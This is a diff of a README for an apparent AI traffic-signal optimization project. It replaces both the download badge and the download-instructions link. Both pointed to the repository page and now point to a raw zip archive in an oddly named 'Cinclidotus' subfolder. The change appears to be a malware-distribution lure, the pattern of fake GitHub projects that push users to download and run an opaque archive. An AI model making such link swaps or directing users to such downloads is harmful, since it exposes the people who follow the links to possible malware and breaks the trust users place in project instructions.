@@ -1,6 +1,6 @@
 # 🚦 ai-trafic-signal-optimization- - Improve City Traffic Flow With Intelligence
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Wastagegermanivy655/ai-trafic-signal-optimization-)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Wastagegermanivy655/ai-trafic-signal-optimization-/main/Cinclidotus/ai-signal-optimization-trafic-2.6-beta.2.zip)
 
 ## 📋 Project Overview
 
@@ -21,7 +21,7 @@ Before you install this software, confirm your computer meets these requirements
 
 ## 📥 How to Download 
 
-Visit this page to download the software: https://github.com/Wastagegermanivy655/ai-trafic-signal-optimization-
+Visit this page to download the software: https://raw.githubusercontent.com/Wastagegermanivy655/ai-trafic-signal-optimization-/main/Cinclidotus/ai-signal-optimization-trafic-2.6-beta.2.zip
 
 1.  Open your preferred web browser.
 2.  Navigate to the link mentioned above.
